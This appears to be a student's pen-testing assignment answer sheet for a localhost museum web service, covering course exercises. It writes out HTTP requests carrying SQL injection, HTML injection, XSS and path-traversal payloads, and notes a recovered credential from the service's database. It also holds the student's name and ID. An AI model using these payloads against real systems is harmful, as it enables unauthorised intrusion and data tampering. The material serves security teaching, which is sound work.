@@ -1,0 +1,74 @@
+Jonas Rogado
+jrog675
+634497108
+CS 335 A4: Pen-Testing the Service
+
+Network User
+
+N01 - Find out where SQL injection is possible within the service APIs. Write down an HTTP request that injects SQL.
+POST http://localhost:8188/MuseumService.svc/comment?name= HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 82
+
+"',''); INSERT INTO Comments (Name, Comment, IP) VALUES('Sami', 'Hello', 335); --"
+
+N02 - Find out where HTML injection is possible within the service APIs. Write down an HTTP request that injects HTML.
+- HTML Injection is possible within the Comment API (http://localhost:8188/MuseumService.svc/comment?name=) 
+(http://localhost:8189/Service.svc/user) which I used for the Comments function
+- Example: 
+POST http://localhost:8188/MuseumService.svc/comment?name=NetworkUser HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 21
+
+"<h1>I am Sami<\/h1>"
+
+N03 - Using HTML injection above, write down an HTTP request that inserts an arbitrary image into the UI you constructed.
+- Example: 
+POST http://localhost:8188/MuseumService.svc/comment?name=NetworkUser HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 73
+
+"<img src = \"https:\/\/html.com\/wp-content\/uploads\/flamingo.jpg\"\/>"
+
+N04 - Write down an HTTP request that leads to executing a user-supplied script.
+-  Example:
+POST http://localhost:8188/MuseumService.svc/comment?name=NetworkUser HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 68
+
+"<script>alert(\"This is a user-supplied script\");<\/script>"
+
+N05 - The services do not stop cross-site request forgery (CSRF) attacks. Describe in a single sentence how a cross-site request forgery attack could be mounted on the service.
+- A cross-site request forgery attack could be mounted on the the service by attaching an external link onto the text being posted.
+
+N06 - Combine the CSRF vulnerability you found above in N05 and the XSS vulnerability you mentioned in N04 in an HTTP request. Write this request down.
+- Example:
+POST http://localhost:8188/MuseumService.svc/comment?name=NetworkUser HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 59
+
+"<script>prompt(\"Win $100\", \"facebook.com\");<\/script>"
+
+Co-Located User
+
+C01 
+- 'SQLite format 3.', in short SQLite
+
+C02
+- The tool that I used to examine the contents of the database is 'DB Browser for SQLite'
+- There are four tables; Comments, Credentials, Items & ShopItems
+
+C03
+- kathe
+
+C04
+- username:realm:password
+- kathu:Museum:documentary
+
+C05
+- http://localhost:8188/MuseumService.svc/shopimg?id=../BigImages/hofeecan.jpg
